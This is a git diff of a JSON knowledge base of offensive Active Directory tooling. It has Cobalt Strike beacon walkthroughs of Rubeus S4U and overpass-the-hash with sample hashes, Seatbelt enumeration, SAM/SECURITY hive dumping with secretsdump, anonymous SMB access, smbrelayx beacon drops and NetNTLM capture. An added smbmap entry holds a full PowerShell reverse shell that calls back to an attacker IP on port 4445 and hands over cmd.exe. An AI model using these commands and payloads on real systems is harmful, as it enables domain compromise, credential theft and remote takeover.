952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1421721239\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'Administrator' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] WLTIk\n\n[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.edu.evil.corp'\n[*]   Final tickets will be for the alternate services 'cifs'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'eventlog/dc-2.edu.evil.corp'\n[+] Sequence number is: 1070349348\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] Substituting alternative service name 'cifs'\n[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.edu.evil.corp':\n\n doIGvD [...snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\dc-2.edu.evil.corp\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Check stored TGT\nUse `Rubeus describe` to show information about the ticket.\n``````beacon\nexecute-assembly Rubeus.exe describe /ticket:C:\\Users\\Administrator\\Desktop\\wkstn2-s4u.kirbi\n\n[*] Action: Describe Ticket\n\n  ServiceName              :  WKSTN2$\n  ServiceRealm             :  edu.evil.corp\n  UserName                 :  patrick\n  UserRealm                :  edu.evil.corp\n  StartTime                :  2/28/2022 7:30:02 PM\n  EndTime                  :  3/1/2022 5:19:32 AM\n  RenewTill                :  1/1/0001 12:00:00 AM\n  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=\n``````\n\n## Ask TGT via certificate\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /aes256 /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Isabel Yates, CN=Users, DC=evil, DC=corp \n[*] Building AS-REQ (w/ PKINIT preauth) for: 'evil.corp\\nglover'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIGNjCCB[...snip...]pYy5pbw==\n\n  ServiceName              :  krbtgt/evil.corp\n  ServiceRealm             :  EVIL.CORP\n  UserName                 :  nglover\n  UserRealm                :  EVIL.CORP\n  StartTime                :  1/18/2022 4:38:26 PM\n  EndTime                  :  1/19/2022 2:38:26 AM\n  RenewTill                :  1/25/2022 4:38:26 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  aes256_cts_hmac_sha1\n  Base64(key)              :  unJ966veiMXllOu4n88hvAcX/6j71To9JJU5Ec48Pds=\n  ASREP (key)              :  6F8361B5177CCC416E67A297C9D61AC975DEAA9E0505DE86657F16EAE9AD8F72\n``````\n\n## [[Overpass-the-Hash]]\nRubeus allows us to perform opth without needing elevated privileges. The process to follow is:\n\n-   Request a TGT for the user we want to impersonate.\n-   Create a sacrificial logon session.\n-   Pass the TGT into that logon session.\n-   Access the target resource.\n\n#OPSEC Rubeus also has an `/opsec` argument which tells it to send the request without pre-auth, to more closely emulate genuine Kerberos traffic.\n\n### SHA256\n1. Request a hash via [[eKeys]] or [[LSASS dumping]] (not recommended anymore)\n2. Ask for a TGT\n```````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec\n\n[*] Action: Ask TGT\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:58:21 PM\n  EndTime               :  7/10/2022 12:58:21 AM\n  RenewTill             :  7/16/2022 2:58:21 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  x4F1hxBrfwvgleEHnYbg9KV5fch2VOS5m36IO/srA0g=\n```````\n\n### RC4\n``````beacon\nMost public articles demonstrate using the NTLM hash to request the TGT.\n\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: 4ffd3eabdce2e158d923ddec72de979e\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:46:58 PM\n  EndTime               :  7/10/2022 12:46:58 AM\n  RenewTill             :  7/16/2022 2:46:58 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  Z1/VMlSwxK4jrbL8qmjvNw==\n``````\n\n\n",
     "commands": [],
-    "latest_commit": "2023-04-24T13:42:59Z"
+    "latest_commit": "2023-05-15T19:24:57Z"
   },
   {
     "name": "ruler",
@@ -2764,8 +2970,47 @@
     "description": "Seatbelt is a .NET application written in C# that has various \"host safety-checks\". The information it gathers includes general OS info, installed antivirus, AppLocker, audit policies, local users and groups, logon sessions, UAC, Windows Firewall and more.",
     "undetected": [],
     "detected": [],
-    "content": "# Seatbelt\n\n## [[Misconfigurations/WSUS]] [[Protections/AppLocker]] [[AV-EDR]] [[Credential Guard]] [[Windows Audit Policies]] [[PowerShell Logging]] [[Event Forwarding]] [[Misconfigurations/WSUS]]\n## Get systems environment\n>execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe -group=system -outputfile=\"file.txt\"\n\n## [[User Access Control (UAC)]]\nQuery the configuration applied to a machine\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe uac\n\n====== UAC ======\n\nConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries\nEnableLUA (Is UAC enabled?)    : 1\n``````\n\n## [[Web Proxies]]\nInternet Settings\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe InternetSettings\n\n  HKCU                       ProxyEnable : 1\n  HKCU                     ProxyOverride : ;local\n  HKCU                       ProxyServer : squid.edu.evil.corp:3128\n``````\n\n## [[SQL Privilege Escalation]]\n## Get TokenPrivileges\n```beacon\nbeacon> getuid\n[*] You are NT Service\\MSSQL$SQLEXPRESS\n\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe TokenPrivileges\n\n====== TokenPrivileges ======\n\nCurrent Token's Privileges\n\n SeAssignPrimaryTokenPrivilege:  DISABLED\n SeIncreaseQuotaPrivilege:  DISABLED\n SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED\n SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeIncreaseWorkingSetPrivilege:  DISABLED\n\n[*] Completed collection in 0.01 seconds\n```\n\n\n",
-    "commands": [],
+    "content": "",
+    "commands": [
+      {
+        "id": "6bd511fa-d052-4e76-94c9-b3e03a7521df",
+        "name": "Get systems environment",
+        "description": "",
+        "tag": "",
+        "results": [
+          "CRED:HASH"
+        ],
+        "cmd": "Seatbelt.exe -group=system -outputfile=\"file.txt\""
+      },
+      {
+        "id": "68526be2-af3d-42b6-937f-462603a0b03b",
+        "name": "Get UAC",
+        "description": "Query the configuration applied to a machine",
+        "tag": "",
+        "results": [
+          "COMPUTER:SEC:UAC"
+        ],
+        "cmd": "Seatbelt.exe uac\n====== UAC ======\n\nConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries\nEnableLUA (Is UAC enabled?)    : 1"
+      },
+      {
+        "id": "963645d6-23d2-4b05-a0b3-6660d30799ea",
+        "name": "Get internet settings",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "Seatbelt.exe InternetSettings\n\n  HKCU                       ProxyEnable : 1\n  HKCU                     ProxyOverride : ;local\n  HKCU                       ProxyServer : squid.edu.evil.corp:3128"
+      },
+      {
+        "id": "b0d0fd28-8881-44ec-aaf0-b6ee3eaf4d84",
+        "name": "Get token privileges",
+        "description": "",
+        "tag": "",
+        "results": [
+          "COMPUTER:SEC:TOKENPRIVS"
+        ],
+        "cmd": "Seatbelt.exe TokenPrivileges\n\n====== TokenPrivileges ======\n\nCurrent Token's Privileges\n\n SeAssignPrimaryTokenPrivilege:  DISABLED\n SeIncreaseQuotaPrivilege:  DISABLED\n SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED\n SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeIncreaseWorkingSetPrivilege:  DISABLED\n\n[*] Completed collection in 0.01 seconds"
+      }
+    ],
     "latest_commit": "2023-03-22T19:40:31Z"
   },
   {
@@ -2784,7 +3029,7 @@
     "detected": [],
     "content": "# Secretsdump\n\n## [[Security Account Manager]]\nReceiving machine passwords via impacket (Admin):\n    ```powershell\n    # Change permissions of hklm\\security to full access\n    reg save hklm\\sam c:\\temp\\sam.save\n    reg save hklm\\security c:\\temp\\security.save\n    reg save hklm\\system c:\\temp\\system.save\n    secretsdump.py -sam C:\\Users\\ext_ecorp_admin\\Desktop\\sam.save -security C:\\Users\\ext_ecorp_admin\\Desktop\\security.save -system C:\\Users\\ext_ecorp_admin\\Desktop\\system.save LOCAL\n    ```\n\n## References\n\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T19:32:46Z"
+    "latest_commit": "2023-05-15T15:04:47Z"
   },
   {
     "name": "SessionGopher",
@@ -2941,12 +3186,35 @@
     "platforms": [
       "Linux"
     ],
-    "source": "",
-    "description": "",
+    "source": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
+    "description": "smbclient \u2014 ftp-like client to access SMB/CIFS resources on servers",
     "undetected": [],
     "detected": [],
-    "content": "\n## [[Guest Access (SMB)]] [[Shares]]\n* `smbclient -U '%' -L //<dc-ip>`\n* `smbclient -U 'guest%' -L //<dc-ip>`\n\n",
-    "commands": []
+    "content": "\n## [[Guest Access (SMB)]] [[Shares]]\n* 'smbclient -U '%' -L //<dc-ip>'\n* 'smbclient -U 'guest%' -L //<dc-ip>'\n\n",
+    "commands": [
+      {
+        "id": "5f637b32-3a34-4429-86df-09d45c63d569",
+        "name": "SMB anonymous login",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbclient -U '%' -L //<ip>",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "9981168c-2f85-4dcd-b14e-20f06ed84414",
+        "name": "SMB guest login",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbclient -U 'guest%' -L //<ip>",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      }
+    ]
   },
   {
     "name": "smbmap",
@@ -2958,12 +3226,130 @@
     "platforms": [
       "Linux"
     ],
-    "source": "",
-    "description": "",
+    "source": "https://github.com/ShawnDEvans/smbmap",
+    "description": "SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.",
     "undetected": [],
     "detected": [],
     "content": "\n## [[Guest Access (SMB)]]\n* `smbmap -u \"\" -p \"\" -P 445 -H <dc-ip>`\n* `smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip>`\n\n\n",
-    "commands": []
+    "commands": [
+      {
+        "id": "f6451a5f-08ea-4bc7-a018-f9bc38fbf921",
+        "name": "SMB anonymous login",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap -u \"\" -p \"\" -P 445 -H <ip>",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "7305314c-e31c-42f1-af86-c4d13e06c0e8",
+        "name": "SMB guest login",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap -u \"guest\" -p \"\" -P 445 -H <ip>",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "338a4da8-b77c-4e08-ba5b-e11383d25df7",
+        "name": "Help",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "Main arguments:\n  -H HOST               IP of host\n  --host-file FILE      File containing a list of hosts\n  -u USERNAME           Username, if omitted null session assumed\n  -p PASSWORD           Password or NTLM hash\n  --prompt              Prompt for a password\n  -s SHARE              Specify a share (default C$), ex 'C$'\n  -d DOMAIN             Domain name (default WORKGROUP)\n  -P PORT               SMB port (default 445)\n  -v                    Return the OS version of the remote host\n  --admin               Just report if the user is an admin\n  --no-banner           Removes the banner from the top of the output\n  --no-color            Removes color from output\n  --no-update           Removes \"Working on it...\" update message from output\n\nCommand Execution:\n  Options for executing commands on the specified host\n\n  -x COMMAND            Execute a command ex. 'ipconfig /all'\n  --mode CMDMODE        Set the execution method, wmi or psexec, default wmi\n\nShard drive Search:\n  Options for searching/enumerating the share of the specified host(s)\n\n  -L                    List all drives on the specified host, requires ADMIN\n                        rights.\n  -R [PATH]             Recursively list dirs, and files (no share\\path lists\n                        ALL shares), ex. 'C$\\Finance'\n  -r [PATH]             List contents of directory, default is to list root of\n                        all shares, ex. -r 'C$\\Documents and\n                        Settings\\Administrator\\Documents'\n  -A PATTERN            Define a file name pattern (regex) that auto downloads\n                        a file on a match (requires -R or -r), not case\n                        sensitive, ex '(web|global).(asax|config)'\n  -g FILE               Output to a file in a grep friendly format, used with\n                        -r or -R (otherwise it outputs nothing), ex -g\n                        grep_out.txt\n  --csv FILE            Output to a CSV file, ex --csv shares.csv\n  --dir-only            List only directories, ommit files.\n  --no-write-check      Skip check to see if drive grants WRITE access.\n  -q                    Quiet verbose output. Only shows shares you have READ\n                        or WRITE on, and suppresses file listing when\n                        performing a search (-A).\n  --depth DEPTH         Traverse a directory tree to a specific depth. Default\n                        is 5.\n  --exclude SHARE [SHARE ...]\n                        Exclude share(s) from searching and listing, ex.\n                        --exclude ADMIN$ C$'\n\nFile Content Search:\n  Options for searching the content of files (must run as root), kind of experimental\n\n  -F PATTERN            File content search, -F '[Pp]assword' (requires admin\n                        access to execute commands, and PowerShell on victim\n                        host)\n  --search-path PATH    Specify drive/path to search (used with -F, default\n                        C:\\Users), ex 'D:\\HR\\'\n  --search-timeout TIMEOUT\n                        Specifcy a timeout (in seconds) before the file search\n                        job gets killed. Default is 300 seconds.\n\nFilesystem interaction:\n  Options for interacting with the specified host's filesystem\n\n  --download PATH       Download a file from the remote system,\n                        ex.'C$\\temp\\passwords.txt'\n  --upload SRC DST      Upload a file to the remote system ex.\n                        '/tmp/payload.exe C$\\temp\\payload.exe'\n  --delete PATH TO FILE\n                        Delete a remote file, ex. 'C$\\temp\\msf.exe'\n  --skip                Skip delete file confirmation prompt",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "d8562afa-f263-41df-a14d-c5c2658c8aff",
+        "name": "SMB login with hash",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "3333793b-2086-4f3b-abc1-6f1d82c71dee",
+        "name": "SMB command exec",
+        "description": "",
+        "tag": "",
+        "results": [
+          "EXECUTION:REMOTE"
+        ],
+        "cmd": "smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group \"Domain Admins\" /domain' -H 192.168.2.50",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "dc866f27-609b-47cc-8ea8-9642e71a0f25",
+        "name": "SMB login",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap.py -H 192.168.12.123 -u administrator -p asdf1234",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "f1218659-f058-4d69-8c44-23a6248fad82",
+        "name": "Non recursive path listing (ls)",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\\Users'",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "b4c2ff7c-d57a-4e5b-bea5-bbd17cc18e17",
+        "name": "File Content Search",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "6ebdf996-1109-46b2-a4b2-5f50523d2242",
+        "name": "Get drives",
+        "description": "",
+        "tag": "",
+        "results": [
+          "COMPUTER:DRIVES"
+        ],
+        "cmd": "smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      },
+      {
+        "id": "349d8da8-632a-4060-bb81-2814f0c3db0b",
+        "name": "Get Shell (PS)",
+        "description": "Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)",
+        "tag": "",
+        "results": [
+          "EXECUTION:REMOTE"
+        ],
+        "cmd": "python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command \"function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\"\"\"\"192.168.0.153\"\"\"\"; $port=\"\"\"\"4445\"\"\"\";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=\"\"\"\"cmd.exe\"\"\"\"  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\"\"\"\" \"\"\"\"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\"'",
+        "requirements": {
+          "tag": "SERVICE:SMB"
+        }
+      }
+    ],
+    "latest_commit": "2023-03-29T13:36:32Z"
   },
   {
     "name": "smbrelayx",
@@ -2981,7 +3367,7 @@
     "detected": [],
     "content": "# smbrelayx\n\n## [[NTLM Relaying]]\n1. Install\n    ```bash\n    pip3 install impacket\n    git clone https://github.com/SecureAuthCorp/impacket\n    ```\n2. Drop and execute beacon on device\n    ```bash\n    cd impacket\n    sudo python3 examples/smbrelayx.py -h 192.168.1.118 -e ~/smbexp.exe\n    ```\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T19:32:46Z"
+    "latest_commit": "2023-05-15T15:04:47Z"
   },
   {
     "name": "smbserver",
@@ -2999,7 +3385,7 @@
     "detected": [],
     "content": "\n## [[SQL NetNTLM Capture]]\nYou may also use the WinDivert + rportfwd combo (shown on the [[NTLM Relaying#Windows - Cobalt Strike]]) with Impacket's `smbserver.py` to capture the NetNTLM hashes.\n```sh\npython3 /usr/local/bin/smbserver.py -smb2support pwn .\n\nImpacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (127.0.0.1,46894)\n[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'\n[*] AUTHENTICATE_MESSAGE (EDU\\svc_mssql,SRV1)\n[*] User SRV1\\svc_mssql authenticated successfully\n[*] svc_mssql::EDU:[...snip...]\n[*] Connecting Share(1:pwn)\n```\n\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T19:32:46Z"
+    "latest_commit": "2023-05-15T15:04:47Z"
   },
   {
     "name": "snmpwalk",
@@ -3288,7 +3674,7 @@
     "detected": [],
     "content": "## [Credentials]\n\n\n",
     "commands": [],
-    "latest_commit": "2023-05-12T20:58:47Z"
+    "latest_commit": "2023-05-15T19:58:38Z"
   },
   {
     "name": "VBad",
@@ -3344,7 +3730,7 @@
     "detected": [],
     "content": "## [[SOCKS Proxy]]\n``````sh\nproxychains python3 /usr/local/bin/wmiexec.py EDU/john@10.10.1.20\n``````\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T19:32:46Z"
+    "latest_commit": "2023-05-15T15:04:47Z"
   },
   {
     "name": "WSuspicious",
@@ -3366,7 +3752,7 @@
     "latest_commit": "2020-10-30T17:52:36Z"
   },
   {
-    "name": "qwinsta/quser",
+    "name": "qwinsta-quser",
     "phases": [
       "03. Host Enumeration"
     ],
@@ -3601,7 +3987,7 @@
         ],
         "cmd": "python ADExplorerSnapshot.py -o bhzip /mnt/c/Users/patri/Downloads/projects/bloodhound-import/install_temp.log",
         "requirements": {
-          "tag": "ADExplorer:Snapshot"
+          "tag": "Tool:ADExplorer:Snapshot"
         }
       }
     ],
@@ -3643,7 +4029,7 @@
         ],
         "cmd": "nbtstat -A <ip>",
         "requirements": {
-          "tag": "A"
+          "tag": "COMPUTER:IP"
         }
       }
     ],
@@ -3739,9 +4125,7 @@
           "INTEL:DOMAIN:DC"
         ],
         "cmd": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers",
-        "requirements": {
-          "tag": "S"
-        }
+        "requirements": {}
       },
       {
         "id": "0513b338-00d6-40f6-9e27-e955c0faf923",
@@ -3803,7 +4187,14 @@
         ],
         "cmd": "kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>",
         "requirements": {
-          "tag": "a"
+          "or": [
+            {
+              "tag": "COMPUTER:HOSTNAME"
+            },
+            {
+              "tag": "COMPUTER:IP"
+            }
+          ]
         }
       },
       {
@@ -3816,7 +4207,14 @@
         ],
         "cmd": "kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt",
         "requirements": {
-          "tag": "L"
+          "or": [
+            {
+              "tag": "COMPUTER:HOSTNAME"
+            },
+            {
+              "tag": "COMPUTER:IP"
+            }
+          ]
         }
       }
     ],
